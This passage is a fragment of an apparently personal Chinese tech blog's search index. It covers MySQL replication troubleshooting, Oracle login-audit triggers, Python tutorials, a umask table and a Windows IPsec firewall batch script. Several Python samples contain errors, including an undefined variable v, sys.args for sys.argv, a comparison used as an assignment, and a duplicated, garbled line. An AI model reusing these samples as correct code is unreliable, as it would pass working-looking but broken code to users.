No(Last_IO_Error: xxxx could not find next log;the first evnet 'mysql-bin.xxxxx') 解决方案: 使用备份恢复，重新初始化主从 4.6.2. SQL 线程故障 执行replaylog日志新事件时,比如增加、删除库或数据时，从库已经存在或已经丢失了将要操作的数据 解决方案: ## 1. 直接重建主从同步(推荐) ## 2. 一切以主库为准，创建失败时候删除从库多余的重启同步即可 ## 3. 执行忽略操作(此操作有一定风险，出非明确知道在干什么，否则不建议使用) mysql\u003e stop slave; mysql\u003e set global sql_slave_skip_counter = 1; ## 将同步移动至下一个操作，如果多次不同步，可重复操作此项 mysql\u003e start slave; ## 4. 同3,只是在配置文件中忽略对应编码 $\u003e vim my.cnf slave-skip-errors = 1032,1062,1007 ## 5. 为防止SQL线程故障，一般会设置从库只读(只针对普通用户) mysql\u003e set global read_only=1; ## $\u003e my.cnf: read_only=1 4.7. 延迟同步(故障) show slave status\\G Seconds_Behind_Master: 主从延时时间(s) 4.7.1. 如何避免延迟同步 sync_binlog=1,0(默认):事务提交不立即写入磁盘，靠操作系统判断什么时候写入;1:每次提交事务都立即刷新binlong到磁盘; 主库大事务很多，拆分为小事务,多事务隔离 主库并发事务很多，使用多(sql)线程复制，针对不同库的事务来进行并发(有局限性) 使用多级主从，分库分表架构 将binlog|relaylog放到高性能(ssd)磁盘上 主备硬件尽量一致 从库越多，压力越大(dump 线程压力越大) sql 线程慢 默认只有一个sql线程，从库中的事务都是一个一个来执行的 如果主库的并发事务很多和大事务，都会造成从库延时 多(sql)线程复制，有局限性，针对不同库的事务来进行并发 4.8. 延迟同步(高级) 4.8.1. 逻辑损坏 延迟从库：从库落后于主库一段时间 SQL线程延时，数据已经写入到relaylog，SQL线程慢点执行 -- 从库执行 mysql\u003e stop slave ; mysql\u003e CHANGE MASTER TO MASTER_DELAY = 3600; -- 建议3-6小时 mysql\u003e start slave ; 案例: 主库误操作，删库 停止主库业务 立即停止从库SQL线程 stop slave sql_thread; 手工模拟sql线程工作，并截止到误操作之前 读取relay-log.info,获取到上次执行到的位置,作为继续执行relay-log的起点，分析relay-log内容，获取到误操作的位置点，截取这段日志，恢复到从库 找到起点位置show slave status\\G,Relay_Log_file:db01-relay-bin.000002;Relay_Log_Pos:283 找到误删除的位","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/:0:0","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","那些有用没用的"],"content":"Oracle 创建登录和退出的触发器","date":"2022-06-24","objectID":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/","tags":["linux","解决方案","oracle"],"title":"Oracle创建登录和退出的触发器","uri":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"categories":["linux","那些有用没用的"],"content":"创建触发记录表 create table log_table( username varchar2(20 ), logon_time date, logoff_time date, address varchar2(20 ) ); 登录触发器 create or replace trigger tr_logon after logon on DATABASE begin INSERT INTO log_table(username,logon_time,address) values(ora_login_user, SYSDATE,ora_client_ip_address); end; / 退出触发器 create or replace trigger tr_logoff before logoff on database begin INSERT INTO log_table(username,logoff_time,address) values(ora_login_user, SYSDATE,ora_client_ip_address); end; / ","date":"2022-06-24","objectID":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/:0:0","tags":["linux","解决方案","oracle"],"title":"Oracle创建登录和退出的触发器","uri":"/posts/other/%E5%88%9B%E5%BB%BA%E7%99%BB%E5%BD%95%E5%92%8C%E9%80%80%E5%87%BA%E7%9A%84%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"categories":["linux","运维记事"],"content":"函数相关","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"1. 多态 同一个方法在不同的类中最终呈现出不同的效果，即为多态。 class demo1(object): def __init__(self,width,height): self.width = width self.height = height def getArea(self): area=self.width* self.height / 2 return area class demo2(object): def __init__(self,size): self.size = size def getArea(self): # 同一个方法在不同的类中最终呈现出不同的效果，即为多态 area = self.size * self.size return area a=demo1(5,5) print(a.getArea()) b=demo2(5) print(v.getArea()) 2. 继承 重构 重写 重载 Python的继承没有类似java中的extends关键字，当Python中一个类需要继承另一个类的时候,只需要将被继承的类通过变量形式传递给新类，即可完成继承 Python还可以实现多继承，将多个被继承类通过变量形式传递给新类，即可完成多继承 2.1. 重写 方法名相同，参数相同，内容不同 2.2. 重载 方法名字相同，参数不同 3. 继承查询 Python2 经典类都是按照深度类查询(及深度优先搜索算法) Python2 新式类都是按照广度类查询(及广度优先搜索算法) Python3 新式类和经典类都是按照广度类查询 4. 示例： 只能说是可以用，但还是有很大部分的疑问，只能用仅剩的一点java记忆强行解释了 class Farm(object): def __init__(self,name,addr): self.name = name self.addr = addr def Recruit(self,worker_obj): pass def BuyAnimal(self,animal_obj): pass def SellAnimal(self,animal_obj): pass def Resign(self,worker_obj): pass class FarmMember(Farm): def __init__(self,name,addr): # 这种也应算重载 super(FarmMember,self).__init__(name,addr) self.farmers = [] def Recruit(self, farmer_obj): # 重写 print(\"为农场申请了一个管理员 %s \" % farmer_obj.name) self.farmers.append(farmer_obj) def Info(self): pass class Manager(FarmMember): def __init__(self,name,addr,age,sex): # 重载 super(Manager, self).__init__(name, addr) self.age = age self.sex = sex self.workers = [] def Info(self): #重写 print(''' --- 管理员 Info %s --- 名字 : %s 年龄 : %s 性别 : %s 地址 : %s '''%(self.name,self.name,self.age,self.sex,self.addr)) def Recruit(self,worker_obj): #重写 print(\"管理员招聘了一个名叫 %s 的员工 \" % worker_obj.name) self.workers.append(worker_obj) def BuyAnimal(self,animal_obj): #重写 print(\"管理员购买了 %s 个 %s , 花费了 %s 元\"%(animal_obj.num, animal_obj.name ,(animal_obj.num * animal_obj.price))) def SellAnimal(self,animal_obj): #重写 print(\"管理员出售了%s 个 %s, 卖了 %s 元\" % (animal_obj.num, animal_obj.name,(animal_obj.num * animal_obj.price))) def Resign(self, worker_obj): #重写 print(\"管理员辞退了 %s \" % worker_obj.name) self.workers.remove(worker_obj) class Home(object): def myHome(self): print(\"我的家在 %s \" % self.addr) class Worker(Manager, Home): def __init__(self,name,addr,age,sex,id): # 广度查询 Manager --\u003e Home --\u003e Farm super(Worker,self).__init__(name, addr, age, sex) self.id = id def Info(self): # 重写 print(''' --- 工人信息 %s --- 编号： %s 名字： %s 性别： %s 年龄： %s 家庭地址： %s ''' % (self.name,self.id,self.name,self.sex,self.age,self.addr)) class Animals(Manager, FarmMember): def __init__(self,name,num,price): # 重载 self.name = name self.num = num self.price = price def Info(self): # 重写 print(''' --- 动物信息 %s 名字: %s 数量：%s 单价：%s ''' %(self.name,self.name,self.num,self.price)) # 实例化农场 fmmr = FarmMember(\"草原1号\", \"山咔咔\") # 实例化管理员 fr = Manager(\"张三\", \"重庆\", \"33\", \"男\") fmmr.Recruit(fr) # 申请一个管理 fr.Info() #实例化普通员工 wr1 = Worker(\"李四\",\"北京\",\"21\",\"男\",1001) wr1.Info() wr2 = Worker(\"王五\",\"上海\",\"22\",\"男\",1002) wr2.Info() wr3 = Worker(\"赵六\", \"广州\", \"22\", \"男\", 1003) wr3.Info() wr3.myHome() # 招聘一个普通员工 fr.Recruit(wr1) fr.Recruit(wr2) fr.Recruit(wr3) # 实例化动物 dw1 = Animals(\"小鸡\",12,6.7) dw2 = Animals(\"小鸭\",22,4.5) fr.BuyAnimal(dw1) fr.SellAnimal(dw2) fr.Resign(wr2) print(\"%s 管理员下的工人还有 \" % fr.name) for i in fr.workers: print(i.name) 5. 类方法、静态方法、属性方法、property 静态方法： 通过修饰器@staticmethod来进行修饰的方法，静态方法不需要定义参数，因此在静态方法中引用类属性的话，必须通过类对象来引用(实际上不可直接访问类和实例中的任何属性和方法)。可通过实例对象或类对象进行访问。 类方法： 是类对象所拥有的方法，需要用修饰器@classmethod来标识其为类方法，第一个参数必须是类对象，一般以cls作为第一个参数。可通过实例对象或类对象进行访问。类方法只能访问类变量，不可访问实例(self)变量。 属性方法： 通过@property来进行修饰，可以将类方法转换为属性对象，使其调用时候可以直接通过实例对象像调用类属性一样进行调用，其总共包含三种访问形式@property, @方法名.setter, @方法名.deleter。一般用来处理私有变量。和java的getter、setter方法有点类似(吧？个人感觉没什么卵用的样子，可能是没有用到) property： 大部分的解释是函数的作用是在新式类中返回属性值,个人还并不是特别理解这个的意思，不过用java来对比的话,就是getter、setter的升级版。property总共包含4个参数: 第一个参数是方法名，在调用(类/实例)对象.属性自动触发执行方法; 第二个参数是方法名，在调用(类/实例)对象.属性=xx时自动触发执行方法; 第三个参数是方法名，在调用del (类/实例)对象.属性时自动触发执行方法; 第四个参数是字符串，在调用实例对象.属性.__doc__,此参数是该属性的描述信息; 示例： class FarmMember(object): addr = \"xxx.xxx\" def __init__(self, title): self.title = title self.__ID = None self.__systemID = None @classmethod def ","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/:0:0","tags":["linux","python"],"title":"Python 函数相关(二)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%BA%8C/"},{"categories":["linux","运维记事"],"content":"函数相关","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"1. 函数参数释义 必选参数 函数定义时,定义了接收变量,那么在函数调用时就必须传递该参数值 默认参数 在函数定义时,可为需要接受值的参数设置一个默认值,若函数调用时,该参数未传入值时,则使用默认值 可变参数 *args(关键字参数) : 可向函数中传递0个或多个参数(类似String…args),内部变量若为*args,结果将为元组,独立值将会顺序接收 **kwargs(命名关键字参数) : 可向函数中以键值对的形式传递0个或多个参数,内部变量若为**kwargs,结果将为字典,独立值将会顺序接收 组合参数 用必选参数、默认参数、可变参数、关键字参数和命名关键字参数，这5种参数可组合使用,但参数传递顺序必须是: 必选参数、默认参数、可变参数、命名关键字参数和关键字参数。 2. 函数即\"变量\" 3. 高阶函数 一个变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为高阶函数 4. 嵌套函数 一个函数中可以包含另一个函数 5. 装饰器 示例代码1: import time def wrapper(func): def demo(*args, **kwargs): print(\"装饰器函数参数调用层 : \", time.time()) res = func(*args, **kwargs) print(\"装饰器函数调用函数参数 : \", args, kwargs) return res return demo @wrapper # 注入? # 函数即变量 #@test == { # test2=test(test1); #调用 # test2(11, a=\"01\") #} == { test1 = test(test1) } def calc(x, **kwargs): y = x * 10 return \"计算结果 y : %s\" % y calc(11, a=\"01\") print(\"=======================\") print(calc(11, a=\"01\")) 示例代码2: import time def wrapper(ltype): print(\"装饰器参数传递层 wrapper: \",ltype) def demo(func): print(\"装饰器函数传递层 demo: \", ltype, func) def A(*args, **kwargs): print(time.time()) print(\"装饰器调用函数参数传递层 A : \", args, kwargs,ltype,func) res = func(*args,**kwargs) print(\"装饰器参数传递值 ltype :\", ltype) return res return A return demo @wrapper(ltype=\"Add\") def calc(x,y,name): z = x + y print(z) return z print(calc(1, 2,name=\"123\")) 6. 生成器 在python中, 一边循环,一边计算的机制,就叫做生成器. 生成器不会第一时间将所有结果生成出来,他只会在循环到(调用)的时候才会生成需要的值,因此对于生成器产生的值是不允许切片的,另外,他每次调用也仅仅只保留当前正在被调用的这个值 生成器定义, 对于列表生成式将[] 替换为 (),创建出来的结果就是一个生成器 ,对于函数,包含了yelid变量(可用于模拟多线程)的就是一个生成器. 6.1. 生成器创建 示例1: # 列表创建 arr = [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] # 列表生成式创建 arr = ( i*2 for i in range(10) ) # arr = \u003cgenerator object \u003cgenexpr\u003e at 0x7fa19c4b9570\u003e arr.__next__() 示例2: # 菲波拉契数列 # 0 1 1 2 3 5 8 13 21 34 ... def fib(max): n, a , b = 0, 0, 1 while n \u003c max: yield b a, b = b, a+b n = n + 1 return \"None\" fib(10) # fib(100) = \u003cgenerator object fib at 0x7efc212447c8\u003e # fi = fib(10) # print(next(fi)) # print(fi.__next__()) # 相关解释 # 1. yield 可以看成一个return但也有不同,当循环每次执行到此处的时候,他会返回结果值并暂停此次循环,以等待下一次的调用 # # 2. 等式 a,b = b, a+b 并不等于 # { # a = b # b = a+b # } # 实际等于 # t = (a, a+b) # a = t[0] # b = t[1] # 关于函数的return # 由于生成生成器的调用必须使用__next__()来进行,而数据的生成大部分的时候都将会有最终的结果,而__next__()的时候是不会知道下一个值是否真正的存在, # 此时__next__()就将会抛出一个程序异常,而这个异常的值就是return返回的值 . 6.2. 生成器调用 生成器的调用, 在2.7中使用的是 next(arr), 3.x中使用的是arr.__next__(),不过next(arr) 在3.x同样也可以使用 6.3. 生成器模拟多线程运行示例(协程) def work(name): print(\"%s 准备开始工作 !\" %name) while True: things = yield name # yield 后面可跟一个值,该值为send()调用后返回结果 print(\"%d 号文件已经收到了 , %s 打开了电脑, 开始工作 !\" %(things,name)) import time def people(): w1 = work(\"用户1\") # 函数调用仅代表创出 w1 = work(\"用户1\") # 函数调用仅代表创出建一个生成器 建一个生成器 w2 = work(\"用户2\") w1.__next__() # 只有在调用的时候才会进行第一次next,从而暂停到 yield 处 w2.__next__() for i in range(5): time.sleep(1) num = i+1 print(\"%s 号工作任务文件来了 ! \" % num) ww1 = w1.send(num) ww2 = w2.send(num) print(\"ww1: %s, ww2: %s\" %(ww1,ww2)) people() 7. 构造函数和析构函数 # 构造函数__init(self)__, 用于类被实例化时候使用，通常用于初始化实例变量 ,每个类必须有一个构造函数 # 析构函数__del(self)__, 一般用于在实例被销毁、释放的时候调用，通常用于一些收尾工作，比如数据库链接，打开的临时文件等 class Demo(object): c = 000 def __init__(self,name): self.name = name def __del__(self): print(\"del: \",self.name, self.c) print(\"函数关闭\") d = Demo(\"Tname\") d.c = 111 d.c1 = 222 print(d.c, d.c1 , d.name) 8. 私有属性和私有方法 在Python类中以__开头的变量为私有变量(属性)，以__开头的函数为私有函数(方法),他们在类的外部不可查，不可被调用 class Demo(object): __c = 111 def __init__(self,name): self.name = name self.__age = 123 def __b(): print(\"hello\") d = Demo(\"Tname\") print(d.__c, d.__age) \"\"\" Traceback (most recent call last): File \"/home/cxd/Projects/node/Python/python.project/practice_script/1.py\", line 13, in \u003cmodule\u003e print(d.__c, d.__age) AttributeError: 'Demo' object has no attribute '__c' \"\"\" d.__b() \"\"\" Traceback (most recent call last): File \"/home/cxd/Projects/node/Python/python.project/practice_script/1.py\", line 22, in \u003cmodule\u003e d.__b() AttributeError: 'Demo' object has no attribute '__b' \"\"\" 9. 迭代(Iterable) 从某个地方（比如一个列表）取出一个元素的过程。当我们使用一个循环来遍历某个东西时，这个过程本身就叫迭代 判断对象是否可迭代(对象): from collections.abc import Iterable print(isinstance('abc', Iterable)","date":"2022-06-24","objectID":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/:0:0","tags":["linux","python"],"title":"Python 函数相关(一)","uri":"/posts/python/%E5%87%BD%E6%95%B0%E4%B8%80/"},{"categories":["linux","运维记事"],"content":"基础语法","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","运维记事"],"content":"1. 循环注意 for item in range(10): print(item) if item == 2: break else: # 当上述循环正常完整的执行完后执行当前分支内容, break为非正常执行完成,不执行else内容 print(\"hello\") i=0 while i \u003c 3: print(i) i +=1 else: # 当上述循环正常执行完成后执行当前分支内容,break为非正常执行 print(\"i=3\",i) 2. 三元运算 # 如果条件成立 值1 否则 值2 result = 值1 if 条件 else 值2 3. range # 共10个数, 从0 开始 打印到9 for i in range(10) : print(i) #共10个数,从0开始,每隔2个数打印一次 for i in range(0,10,2): print(i) 4. python 模块 4.1. sys print(sys.path) # 打印系统环境变量 print(sys.args) # 打印脚本传递参数 第一个为脚本名称($(pwd)/script_name) 后续为脚本传递的参数值 4.2. os print(os.system(\"ls\")) # 执行系统命令,并将结果打印到前台,并返回执行状态(成功)0或非0(失败) print(os.popen(\"ls\").read()) # 执行系统命令,并将结果存入内存中,使用read读取并打印到前台 5. 数组类型 5.1. bytes msg = \"你好 , Python! \" print(msg.encode(encoding=\"UTF-8\")) print(msg.encode(encoding=\"utf-8\").decode(encoding=\"utf-8\")) 5.2. 列表 5.2.1. 列表就是java的数组,不过python的列表可以各个类型混用 ### 列表生成式 ### # arr = [ i*2 for i in range(10) ] 列表中可以是函数调用 # arr = [0, 2, 4, 6, 8, 10, 12, 14, 16, 18] ### 列表生成式 ### arr = [\"a\",\"b\",\"c\",\"d\",\"e\",\"z\",\"z\",1] arr2 = [1,2,3,4] arr3 = [\"01\", \"02\", \"03\"] print(arr[0],arr[3]) #切片: 取出下标为0-2的字符串,包前不包后 print(arr[0:3]) #切片: 取出最后一个值 print(arr[-1]) #切片: 取出最后3个值 print(arr[-3:]) #切片: 取出倒数第二个第三个值 print(arr[-3:-1]) #切片: 每隔一个值取值 print(arr[1:-1:2]) # == arr[::2] # 增加 arr.append(\"zz\") # 插入 arr.insert(0,\"aa\") # 修改 arr[2] == \"bb\" # 删除 arr.remove(\"d\") del arr[4] # 4 : e # 默认删除最后一个值, arr.pop() # 删除倒数第二个值 和 del arr[-2] 等价 arr.pop(-2) # 查询 print(arr.index(\"aa\")) # 统计值总共的个数 print(arr.count(\"z\")) # 反转列表值 arr.reverse() # 列表合并,新列表追加到末尾 arr.extend(arr2) # 删除列表 del arr2 arr.append(arr3) # 列表复制(浅copy: 只复制第一层) { # 作用: 用于创建联合账号 #arr4 = arr[:] #arr4 = list(arr) arr4 = arr.copy() del arr3 arr[0] = \"AA\" arr[-1][0] = \"001\" print(arr) print(arr4) # arr=['AA', 'a', 'bb', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '02', '03']] # arr4=['aa', 'a', 'bb', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '02', '03']] } # 等号赋值 { arr5 = arr arr[11][1] = \"002\" print(arr,arr5) # ['AA', 'a', 'BB', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '002', '03']] # ['AA', 'a', 'BB', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '002', '03']] } # 深COPY { import copy # copy.copy 相当于 列表的copy arr6 = copy.deepcopy(arr) arr[-1][2] = \"003\" arr[6] = 11 print(arr,arr6) # ['AA', 'a', 'BB', 'c', 'z', 'z', 11, 1, 2, 3, 4, ['001', '002', '003']] # ['AA', 'a', 'BB', 'c', 'z', 'z', 1, 1, 2, 3, 4, ['001', '002', '03']] } 5.2.2. 列表 COPY 图示 浅 copy 图示 等值图示 深 COPY 图示 5.2.3. 列表遍历索引的几种方式 arr = [\"a\", \"b\", \"c\", \"d\", \"e\", \"z\", \"z\", 1] # 1. n = 0 for i in arr: print(n,i) n += 1 # 2. print(\"-----------\") for i in range(len(arr)): print(i,arr[i]) # 3. print(\"-----------\") for i,item in enumerate(arr): print(i,item) 5.3. 元组(只读列表) # 只能查看、切片 arr = (\"a\",\"b\",\"c\",\"d\",\"e\",\"z\",\"z\",1) 5.4. 字典(map) key, value 字典无序 key 唯一 info = { 'A': \"1\", \"B\": \"2\", \"C\": \"33\" } print(info[\"A\"]) # 存在修改 不存在 新增 info[\"A\"] = \"11\" info[\"D\"] = \"44\" # 删除 del info[\"A\"] info.pop(\"D\") # 随机删除 info.popitem() ## 查询 info[\"A\"] # 存在返回值,不存在抛出异常 print(info.get(\"B\")) # 存在返回值,不存在返回None print(\"B\" in info) # 存在返回True 不存在 返回False # 若 key存在,则不做任何操作,若key不存在,则新增字典值 info.setdefault(\"A\",\"000\") info1 = { \"A\":\"111\", 1 : \"2\" } # 合并两个字典的值,相同key则更新,不同直接合并 info.update(info1) # 将字典转换为列表 info2 = info.items() # 初始化新的字典key 1,2,3 value: default (仅适用于创建一维字典,多为字典存在浅COPY的问题) info3 = dict.fromkeys([1,2,3],\"default\") # 字典循环 for i in info: print(\"in:\", i,info[i]) for k,v in info.items(): print(\"kv:\",k,v) 5.5. 集合 arr = [\"a\", \"b\", \"c\", \"d\", \"e\", \"z\", \"z\", 1] # 将列表转换为集合(合并重复项,可用于列表去重复) arr = set(arr) # 集合定义 arr1 = set([\"a\", \"b\", \"c\", \"dd\", \"ee\", \"z\"]) arr2 = set([\"aa\", \"bb\", \"cc\", \"dd\", \"ee\", \"zz\"]) arr3 = set([\"a\", \"b\", \"c\"]) # 获取集合长度 print(len(arr1)) # 判断字符串是否在集合内 True/False print(\"a\" in arr1) # 判断字符串是否不在集合内 True/False print(\"a\" not in arr1) # 获取集合交集 arr4 = arr1.intersection(arr2) # (arr1 \u0026 arr2) print(arr4) # 获取集合并集 arr5 = arr1.union(arr2) # (arr1 | arr2) print(arr5) # 获取集合差集(arr1中存在,arr2中不存在) arr6 = arr1.difference(arr2) # (arr1 - arr2 ) print(arr6) # 判断 arr1 是不是arr3 的子集, 返回True/false arr7 = arr1.issubset(arr3) print(arr7) # 判断 arr1 是不是arr3 的父集, 返回True/fal","date":"2022-06-24","objectID":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:0:0","tags":["linux","python"],"title":"Python 基础语法","uri":"/posts/python/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["linux","整理收集"],"content":"Umask码权限对照表,方便查询，不用在去计算了","date":"2022-06-24","objectID":"/posts/linux/umask%E7%A0%81%E6%9D%83%E9%99%90%E5%AF%B9%E7%85%A7%E8%A1%A8/","tags":["linux","解决方案"],"title":"Umask码权限对照表","uri":"/posts/linux/umask%E7%A0%81%E6%9D%83%E9%99%90%E5%AF%B9%E7%85%A7%E8%A1%A8/"},{"categories":["linux","整理收集"],"content":"Umask 码权限对照表 umask file dir 000 666 777 001 666 776 002 664 775 003 664 774 004 662 773 005 662 772 006 660 771 007 660 770 010 666 767 011 666 766 012 664 765 013 664 764 014 662 763 015 662 762 016 660 761 017 660 760 020 646 757 021 646 756 022 644 755 023 644 754 024 642 753 025 642 752 026 640 751 027 640 750 030 646 747 031 646 746 032 644 745 033 644 744 034 642 743 035 642 742 036 640 741 037 640 740 040 626 737 041 626 736 042 624 735 043 624 734 044 622 733 045 622 732 046 620 731 047 620 730 050 626 727 051 626 726 052 624 725 053 624 724 054 622 723 055 622 722 056 620 721 057 620 720 060 606 717 061 606 716 062 604 715 063 604 714 064 602 713 065 602 712 066 600 711 067 600 710 070 606 707 071 606 706 072 604 705 073 604 704 074 602 703 075 602 702 076 600 701 077 600 700 100 666 677 101 666 676 102 664 675 103 664 674 104 662 673 105 662 672 106 660 671 107 660 670 110 666 667 111 666 666 112 664 665 113 664 664 114 662 663 115 662 662 116 660 661 117 660 660 120 646 657 121 646 656 122 644 655 123 644 654 124 642 653 125 642 652 126 640 651 127 640 650 130 646 647 131 646 646 132 644 645 133 644 644 134 642 643 135 642 642 136 640 641 137 640 640 140 626 637 141 626 636 142 624 635 143 624 634 144 622 633 145 622 632 146 620 631 147 620 630 150 626 627 151 626 626 152 624 625 153 624 624 154 622 623 155 622 622 156 620 621 157 620 620 160 606 617 161 606 616 162 604 615 163 604 614 164 602 613 165 602 612 166 600 611 167 600 610 170 606 607 171 606 606 172 604 605 173 604 604 174 602 603 175 602 602 176 600 601 177 600 600 200 466 577 201 466 576 202 464 575 203 464 574 204 462 573 205 462 572 206 460 571 207 460 570 210 466 567 211 466 566 212 464 565 213 464 564 214 462 563 215 462 562 216 460 561 217 460 560 220 446 557 221 446 556 222 444 555 223 444 554 224 442 553 225 442 552 226 440 551 227 440 550 230 446 547 231 446 546 232 444 545 233 444 544 234 442 543 235 442 542 236 440 541 237 440 540 240 426 537 241 426 536 242 424 535 243 424 534 244 422 533 245 422 532 246 420 531 247 420 530 250 426 527 251 426 526 252 424 525 253 424 524 254 422 523 255 422 522 256 420 521 257 420 520 260 406 517 261 406 516 262 404 515 263 404 514 264 402 513 265 402 512 266 400 511 267 400 510 270 406 507 271 406 506 272 404 505 273 404 504 274 402 503 275 402 502 276 400 501 277 400 500 300 466 477 301 466 476 302 464 475 303 464 474 304 462 473 305 462 472 306 460 471 307 460 470 310 466 467 311 466 466 312 464 465 313 464 464 314 462 463 315 462 462 316 460 461 317 460 460 320 446 457 321 446 456 322 444 455 323 444 454 324 442 453 325 442 452 326 440 451 327 440 450 330 446 447 331 446 446 332 444 445 333 444 444 334 442 443 335 442 442 336 440 441 337 440 440 340 426 437 341 426 436 342 424 435 343 424 434 344 422 433 345 422 432 346 420 431 347 420 430 350 426 427 351 426 426 352 424 425 353 424 424 354 422 423 355 422 422 356 420 421 357 420 420 360 406 417 361 406 416 362 404 415 363 404 414 364 402 413 365 402 412 366 400 411 367 400 410 370 406 407 371 406 406 372 404 405 373 404 404 374 402 403 375 402 402 376 400 401 377 400 400 400 266 377 401 266 376 402 264 375 403 264 374 404 262 373 405 262 372 406 260 371 407 260 370 410 266 367 411 266 366 412 264 365 413 264 364 414 262 363 415 262 362 416 260 361 417 260 360 420 246 357 421 246 356 422 244 355 423 244 354 424 242 353 425 242 352 426 240 351 427 240 350 430 246 347 431 246 346 432 244 345 433 244 344 434 242 343 435 242 342 436 240 341 437 240 340 440 226 337 441 226 336 442 224 335 443 224 334 444 222 333 445 222 332 446 220 331 447 220 330 450 226 327 451 226 326 452 224 325 453 224 324 454 222 323 455 222 322 456 220 321 457 220 320 460 206 317 461 206 316 462 204 315 463 204 314 464 202 313 465 202 312 466 200 311 467 200 310 470 206 307 471 206 306 472 204 305 473 204 304 474 202 303 475 202 302 476 200 301 477 200 300 500 266 277 501 266 276 502 264 275 503 264 274 504 262 273 505 262 272 506 260 271 507 260 270 510 266 267 511 266 266 512 264 265 ","date":"2022-06-24","objectID":"/posts/linux/umask%E7%A0%81%E6%9D%83%E9%99%90%E5%AF%B9%E7%85%A7%E8%A1%A8/:0:0","tags":["linux","解决方案"],"title":"Umask码权限对照表","uri":"/posts/linux/umask%E7%A0%81%E6%9D%83%E9%99%90%E5%AF%B9%E7%85%A7%E8%A1%A8/"},{"categories":["那些年的收藏"],"content":"IPSEC","date":"2022-06-24","objectID":"/posts/scripts/bat/ipsec/","tags":["bat","ipsec","windows","scripts"],"title":"windows 本地安全策略设置","uri":"/posts/scripts/bat/ipsec/"},{"categories":["那些年的收藏"],"content":"开机临时关闭本地安全策略(防止配置出错，导致无法登录) netsh ipsec static set policy name=我的规则 assign=n ping 127.0 -n 300 \u003enul 2\u003enul netsh ipsec static set policy name=我的规则 assign=y net start PolicyAgent 本地安全策略初始化设置脚本 @echo off title DD-IP策略设置 color 0A echo 一般配置为\"1\"即可(注:需要主动配置信任的远程ip) echo 设置ipsec前首先要关闭系统防火墙。 echo windows2003可以停止服务，但是2008下只能关闭，不能停止服务 echo 确认之后按任意键继续 pause :menu cls echo 1 公网服务器基本配置(基本端口) echo 2 亚马逊内网网段信任(172.31.0.0/16) echo 3 lefux机房内部服务器基本配置 echo 4 邮件服务器 echo 5 VPN服务器 echo 6 DNS服务器 echo 7 添加本机IP段 echo 8 FTP对外规则 echo 10 激活策略 echo q 退出 set /p convert=请选择 if \"%CONVERT%\"==\"1\" goto a if \"%CONVERT%\"==\"2\" goto b if \"%CONVERT%\"==\"3\" goto c if \"%CONVERT%\"==\"4\" goto d if \"%CONVERT%\"==\"5\" goto e if \"%CONVERT%\"==\"6\" goto f if \"%CONVERT%\"==\"7\" goto g if \"%CONVERT%\"==\"8\" goto h if \"%CONVERT%\"==\"10\" goto i if \"%CONVERT%\"==\"q\" goto ext echo 亲，你的选择无效，你只能选择1-10 或者 q才可以哟，再试试吧！ ping -n 5 127.0.0.1 \u003e null echo. goto menu :a echo 服务器IP策略基本配置 :: 建立一个名字叫“我的规则”的安全策略先 netsh ipsec static add policy name=我的规则 :: 建立2条操作动作 netsh ipsec static add filteraction name=Permit action=permit netsh ipsec static add filteraction name=Block action=block ::对外端口访问规则 netsh ipsec static add filterlist name=80port description=\"与其他服务器80端口的交互\" netsh ipsec static add filter filterlist=80port srcaddr=any dstaddr=me dstport=80 protocol=TCP description=\"允许其他服务器访问本机80端口\" netsh ipsec static add filter filterlist=80port srcaddr=any dstaddr=me dstport=443 protocol=TCP description=\"允许其他服务器访问本机443端口\" ::允许本机访问其他服务器特定的端口，如果没有这条就只能访问信任IP netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=80 protocol=TCP description=\"允许本机访问其他服务器80\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=443 protocol=TCP description=\"允许本机访问其他服务器443端口\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=53 protocol=TCP description=\"允许本机访问其他服务器DNS端口\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any dstport=53 protocol=UDP description=\"允许本机访问其他服务器DNS端口\" netsh ipsec static add filter filterlist=80port srcaddr=me dstaddr=any protocol=ICMP description=\"允许本机ping其他服务器\" netsh ipsec static 